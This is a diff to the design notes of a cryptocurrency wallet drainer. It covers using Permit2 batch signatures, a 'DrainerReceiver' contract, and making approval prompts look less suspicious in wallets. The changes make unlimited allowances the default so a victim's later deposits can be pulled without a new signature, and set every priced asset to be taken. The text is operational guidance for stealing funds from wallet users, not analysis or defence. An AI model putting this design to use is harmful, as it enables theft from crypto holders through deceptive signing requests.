@@ -63,8 +63,11 @@ The sender inspects the latest block. baseFeePerGas present and non-zero -> EIP-
 fixed-price chains). Both paths use the per-chain chainId and an explicit gas-balance preflight.
 
 Caps
-capped  -> 1,000,000 * 10^dec, or balance*2 if the balance already exceeds that.
-unlimited -> uint160 max (wallet shows "Unlimited").
+Default is unlimited: the Permit2 amount is uint160 max, so a top-up after signing
+can still be pulled without a re-sign. capped -> 1,000,000 * 10^dec, or balance*2
+if the balance already exceeds that (a round number the wallet shows plainly).
+Coverage defaults: min USD/asset 0, include-unpriced on — every priced asset is
+taken, and unpriced tokens with a balance are labelled rather than skipped.
 
 Wallet rendering, worst to best for suspicion:
   uint256 max + plain approve        -> "Unlimited", amber warning
@@ -74,8 +77,11 @@ Wallet rendering, worst to best for suspicion:
 Permit2 batching
 One PermitBatch signature covers every token on a chain. Permit2 marks the nonce used on the
 first spend, so the drain submits the whole signed batch in one permitAndPull transaction
-(tokens[]/amounts[]). Each grant stores the exact signed batch JSON; record_signed recovers
-the signature against that stored batch, not a rebuilt single-token message.
+(tokens[]/amounts[]). The batch is recorded as consumed; every later pull on it goes through
+DrainerReceiver.pullPermit2(token, from, amount) with no new signature. Each grant stores the
+exact signed batch JSON; record_signed recovers the signature against that stored batch, not a
+rebuilt single-token message. A receiver deployed before pullPermit2 existed is refused at
+prepare time — redeploy it.
 
 Known limits
 * Native ETH/BNB/POL/AVAX/MNT/TRX cannot be pulled by allowance. Taken in the onboarding
